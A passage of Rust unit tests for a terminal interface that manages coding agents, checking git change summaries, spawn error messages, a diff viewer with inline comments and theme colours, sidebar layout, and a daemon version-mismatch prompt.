        let lines: Vec<&str> = text.lines().collect();
        let row = |needle: &str| {
            lines
                .iter()
                .position(|line| line.contains(needle))
                .unwrap_or_else(|| panic!("no {needle:?}\n{text}"))
        };
        assert!(
            row("branch  lazyagents/wt") < row("changes +10 −1"),
            "{text}"
        );
        assert!(row("changes +10 −1") < row("1 uncommitted"), "{text}");

        app.apply_git_stat(wt.id, Err("git failed".into()));
        let text = info(&app);
        assert!(text.contains("branch  lazyagents/wt"), "{text}");
        assert!(!text.contains("files"), "{text}");
        let (text, _) = render(&app);
        assert!(!text.contains("git failed"), "{text}");
    }

    #[test]
    fn spawn_error_shows_in_pane() {
        let p = project("p");
        let failed = AgentInfo {
            last_error: Some("No such file or directory (os error 2)".into()),
            ..agent(&p, "bad", Status::Exited(127))
        };
        let (app, _) = loaded(vec![p.clone()], vec![failed]);
        let (text, _) = render(&app);
        assert!(
            text.contains("failed to start: No such file or directory (os error 2)"),
            "{text}"
        );
        assert!(text.contains("press r to retry"), "{text}");

        let (app, _) = loaded(
            vec![p.clone()],
            vec![AgentInfo {
                last_error: Some("old".into()),
                ..agent(&p, "ok", Status::Idle)
            }],
        );
        let (text, _) = render(&app);
        assert!(!text.contains("failed to start"), "{text}");

        let (app, _) = loaded_with(
            configured("[keys.sidebar]\nrestart = \"F\"\n"),
            vec![p.clone()],
            vec![AgentInfo {
                last_error: Some("boom".into()),
                ..agent(&p, "bad", Status::Exited(127))
            }],
        );
        let (text, _) = render(&app);
        assert!(text.contains("press F to retry"), "{text}");
    }

    #[test]
    fn an_exit_error_shows_over_the_agents_last_screen() {
        let p = project("p");
        let failed = AgentInfo {
            last_error: Some(
                "direnv blocked the worktree's .envrc; run: direnv allow /s/wt".into(),
            ),
            ..agent(&p, "wt", Status::Exited(1))
        };
        let (mut app, _) = loaded(vec![p], vec![failed]);
        app.screen = Screen::blank(40, 3);
        for (cell, c) in app.screen.lines[0].iter_mut().zip("direnv: error".chars()) {
            cell.text = c.to_string();
        }
        let (text, _) = render_at(&app, 140, 30);
        assert!(text.contains("run: direnv allow /s/wt"), "{text}");
        assert!(text.contains("press r to retry"), "{text}");
    }

    fn open_diff(app: &mut App, text: &str) {
        let id = app.selected_agent().map(|a| a.id).expect("agent");
        let _ = app.on_key(KeyEvent::new(KeyCode::Char('D'), KeyModifiers::SHIFT));
        let (screen, _) = render(app);
        assert!(screen.contains("loading diff…"), "{screen}");
        app.apply_diff(id, Ok(text.to_string()));
    }

    const SAMPLE_DIFF: &str =
        "diff --git a/f b/f\nindex 1..2 100644\n--- a/f\n+++ b/f\n@@ -1 +1 @@\n-old\n+new\n same";

    #[test]
    fn diff_comments_show_under_their_line_and_the_cursor_is_highlighted() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        open_diff(&mut app, SAMPLE_DIFF);
        for _ in 0..6 {
            let _ = app.on_key(KeyEvent::new(KeyCode::Char('j'), KeyModifiers::NONE));
        }
        let _ = app.on_key(KeyEvent::new(KeyCode::Char('c'), KeyModifiers::NONE));
        let (text, _) = render(&app);
        assert!(text.contains(" Comment on f:1 "), "{text}");
        for c in "rename".chars() {
            let _ = app.on_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE));
        }
        let _ = app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
        let (text, buffer) = render(&app);
        let rows: Vec<&str> = text.lines().collect();
        let new = rows
            .iter()
            .position(|r| r.contains("│+new"))
            .expect("+new row");
        assert!(rows[new + 1].contains("  ✎ rename"), "{text}");
        assert!(rows[new + 2].contains(" same"), "{text}");
        let layout = layout(Rect::new(0, 0, 100, 30), &app);
        assert_eq!(
            buffer[(layout.pane_inner.x, new as u16)].bg,
            app.theme.selected
        );
        let status = text.lines().last().expect("status line");
        assert!(
            status.starts_with("q/esc/D close · c comment · S send comments"),
            "{status}"
        );
    }

    #[test]
    fn diff_view_colours_lines() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        open_diff(&mut app, SAMPLE_DIFF);
        let (text, buffer) = render(&app);
        let layout = layout(Rect::new(0, 0, 100, 30), &app);
        let at = |needle: &str| {
            let y = text
                .lines()
                .position(|line| line.contains(needle))
                .unwrap_or_else(|| panic!("no {needle:?}\n{text}"));
            &buffer[(layout.pane_inner.x, y as u16)]
        };
        for header in ["diff --git", "index 1..2", "--- a/f", "+++ b/f"] {
            assert!(at(header).modifier.contains(Modifier::BOLD), "{header}");
            assert_eq!(at(header).fg, Color::Reset, "{header}");
        }
        assert_eq!(at("@@ -1 +1 @@").fg, Color::Cyan);
        assert_eq!(at("-old").fg, Color::Red);
        assert_eq!(at("+new").fg, Color::Green);
        assert!(!at("+new").modifier.contains(Modifier::BOLD));
        assert_eq!(at(" same").fg, Color::Reset);
        assert_eq!(buffer[(layout.pane.x, layout.pane.y)].fg, Color::Green);
        assert!(text.contains(" diff · a · all changes · 1 file "), "{text}");
        let status = text.lines().last().expect("status line");
        assert!(status.contains("q/esc/D close"), "{status}");
        let _ = app.set_pane_size(73, 5);
        for _ in 0..5 {
            let _ = app.on_key(KeyEvent::new(KeyCode::Char('j'), KeyModifiers::NONE));
        }
        let (text, _) = render(&app);
        let first = text
            .lines()
            .nth(usize::from(layout.pane_inner.y))
            .expect("row");
        assert!(first.contains("│index 1..2"), "{text}");

        let config = configured(
            "[theme]\ndiff_add = \"blue\"\ndiff_remove = \"magenta\"\ndiff_hunk = \"yellow\"\n",
        );
        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
        let (mut app, _) = loaded_with(config, vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        open_diff(&mut app, SAMPLE_DIFF);
        let (text, buffer) = render(&app);
        let at = |needle: &str| {
            let y = text
                .lines()
                .position(|line| line.contains(needle))
                .unwrap_or_else(|| panic!("no {needle:?}\n{text}"));
            buffer[(layout.pane_inner.x, y as u16)].fg
        };
        assert_eq!(at("@@ -1 +1 @@"), Color::Yellow);
        assert_eq!(at("-old"), Color::Magenta);
        assert_eq!(at("+new"), Color::Blue);

        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        open_diff(&mut app, "");
        let (text, _) = render(&app);
        assert!(text.contains("no changes"), "{text}");
    }

    #[test]
    fn screen_modes_narrow_or_hide_the_sidebar() {
        let screen = Rect::new(0, 0, 120, 30);
        let normal = areas_in(screen, 2, 4, ScreenMode::Normal);
        assert_eq!(normal.agents.width, 30);
        let wide = areas_in(screen, 2, 4, ScreenMode::Wide);
        assert_eq!(wide.agents.width, WIDE_SIDEBAR);
        assert_eq!(
            wide.pane,
            Rect::new(WIDE_SIDEBAR, 0, 120 - WIDE_SIDEBAR, 29)
        );
        let full = areas_in(screen, 2, 4, ScreenMode::Full);
        assert_eq!(full.agents.width, 0);
        assert_eq!(full.pane, Rect::new(0, 0, 120, 29));
    }

    #[test]
    fn layout_reserves_status_row_and_sidebar() {
        let a = areas(Rect::new(0, 0, 100, 30), 2, 4);
        assert_eq!(a.status, Rect::new(0, 29, 100, 1));
        assert_eq!(a.projects.width, 25);
        assert_eq!(a.projects.height, 4);
        assert_eq!(a.info.height, 6);
        assert_eq!(a.pane.x, 25);
        assert_eq!(a.pane_inner, Rect::new(26, 1, 73, 27));
        assert_eq!(areas(Rect::new(0, 0, 100, 30), 2, 1).info.height, 6);
    }

    #[test]
    fn info_panel_fits_its_content_and_shrinks_on_short_terminals() {
        let tall = areas(Rect::new(0, 0, 100, 30), 2, 7);
        assert_eq!((tall.info.height, tall.agents.height), (9, 16));
        assert_eq!(tall.info.bottom(), tall.status.y);
        let medium = areas(Rect::new(0, 0, 100, 20), 2, 7);
        assert_eq!((medium.info.height, medium.agents.height), (7, 8));
        let short = areas(Rect::new(0, 0, 100, 16), 2, 7);
        assert_eq!((short.info.height, short.agents.height), (6, 5));
        let tiny = areas(Rect::new(0, 0, 100, 8), 2, 7);
        assert_eq!((tiny.info.height, tiny.agents.height), (3, 0));
    }

    #[test]
    fn info_shows_everything_for_a_worktree_agent_with_stats() {
        let p = project("p");
        let wt = worktree_agent(&p, "wt");
        let (mut app, _) = loaded(vec![p], vec![wt.clone()]);
        app.apply_git_stat(
            wt.id,
            Ok(GitStat {
                insertions: 4,
                deletions: 2,
                files: 3,
                uncommitted: 1,
            }),
        );
        let (text, _) = render(&app);
        let info = layout(Rect::new(0, 0, 100, 30), &app).info;
        let rows: Vec<String> = text
            .lines()
            .skip(usize::from(info.y + 1))
            .take(usize::from(info.height - 2))
            .map(|line| {
                line.chars()
                    .skip(1)
                    .take(usize::from(info.width - 2))
                    .collect()
            })
            .collect();
        let rows: Vec<&str> = rows.iter().map(|row| row.trim_end()).collect();
        assert_eq!(
            rows,
            [
                "branch  lazyagents/wt",
                "changes +4 −2",
                "files   3 changed",
                "        1 uncommitted",
                "cwd     /s/worktrees/wt",
            ],
            "{text}"
        );
    }

    fn assert_rounded(text: &str) {
        assert!(text.contains('╭') && text.contains('╯'), "{text}");
        assert!(!text.contains(['┌', '┐', '└', '┘']), "{text}");
    }

    #[test]
    fn every_box_has_rounded_corners() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        app.popup = Some(Popup::Help);
        assert_rounded(&render(&app).0);
        app.popup = None;
        let _ = app.on_key(KeyEvent::new(KeyCode::Char('s'), KeyModifiers::NONE));
        assert_rounded(&render(&app).0);
        assert_rounded(&mismatch_text(Mismatch::Asking));
    }

    fn mismatch_text(stage: Mismatch) -> String {
        let mut terminal = Terminal::new(TestBackend::new(100, 20)).expect("terminal");
        terminal
            .draw(|f| draw_mismatch(f, "0.1.0", 1, stage))
            .expect("draw");
        let buffer = terminal.backend().buffer();
        (0..buffer.area.height)
            .map(|y| {
                (0..buffer.area.width)
                    .map(|x| buffer[(x, y)].symbol())
                    .collect::<String>()
            })
            .collect::<Vec<_>>()
            .join("\n")
    }

    #[test]
    fn mismatch_prompt_shows_the_daemon_being_stopped() {
        let text = mismatch_text(Mismatch::Stopping(Some(4242)));
        assert!(text.contains("stopping daemon 4242…"), "{text}");
        assert!(!text.contains("y restart"), "{text}");
        let text = mismatch_text(Mismatch::Stopping(None));
        assert!(text.contains("stopping daemon…"), "{text}");
    }

    #[test]
    fn mismatch_popup_text() {
        let text = mismatch_text(Mismatch::Asking);
        assert!(
            text.contains(&format!(
                "This lazyagents (protocol {}) can't talk to the running daemon 0.1.0 (protocol 1).",
                protocol::PROTOCOL_VERSION
            )),
            "{text}"
        );
        assert!(
            text.contains("Restart the daemon? This stops every running agent."),
            "{text}"
        );
        assert!(text.contains("y restart · n quit"), "{text}");
    }

    #[test]
    fn row_at_maps_rows_with_scrolling() {
        let area = Rect::new(0, 3, 25, 6);
        assert_eq!(row_at(area, 0, 10, 3), None);
        assert_eq!(row_at(area, 0, 10, 4), Some(0));
        assert_eq!(row_at(area, 0, 10, 7), Some(3));
        assert_eq!(row_at(area, 0, 10, 8), None);
        assert_eq!(row_at(area, 3, 10, 7), Some(3));
        assert_eq!(row_at(area, 5, 10, 4), Some(2));
        assert_eq!(row_at(area, 5, 10, 7), Some(5));
        assert_eq!(row_at(area, 9, 10, 7), Some(9));
        assert_eq!(row_at(area, 0, 2, 5), Some(1));
        assert_eq!(row_at(area, 0, 2, 6), None);
        assert_eq!(row_at(area, 0, 0, 4), None);
        assert_eq!(row_at(Rect::new(0, 0, 25, 2), 0, 3, 0), None);
        assert_eq!(row_at(Rect::new(0, 0, 25, 2), 0, 3, 1), None);
    }

    #[test]
    fn row_at_matches_the_rendered_list() {
        let p = project("p");
        let agents: Vec<_> = (0..20)
            .map(|i| agent(&p, &format!("agent{i:02}"), Status::Idle))
            .collect();
        let (mut app, _) = loaded(vec![p], agents);
        app.agent_index = 19;
        let (text, _) = render(&app);
        let area = layout(Rect::new(0, 0, 100, 30), &app).agents;
        let lines: Vec<&str> = text.lines().collect();
        for y in area.y + 1..area.bottom() - 1 {
            let index = row_at(area, app.agent_index, 20, y).expect("row");
            let name = format!("agent{index:02}");
            assert!(lines[usize::from(y)].contains(&name), "{y}: {name}\n{text}");
        }
    }

    #[test]
    fn selection_is_drawn_reversed() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        app.screen = Screen::blank(73, 27);
        app.selection = Some(crate::app::Selection {
            anchor: (70, 0),
            end: (1, 1),
        });
        let (_, buffer) = render(&app);
        let inner = layout(Rect::new(0, 0, 100, 30), &app).pane_inner;
        let reversed = |x: u16, y: u16| {
            buffer[(inner.x + x, inner.y + y)]
                .modifier
                .contains(Modifier::REVERSED)
        };
        assert!(!reversed(69, 0));
        assert!(reversed(70, 0) && reversed(72, 0));
        assert!(reversed(0, 1) && reversed(1, 1));
        assert!(!reversed(2, 1) && !reversed(0, 2));
    }
}
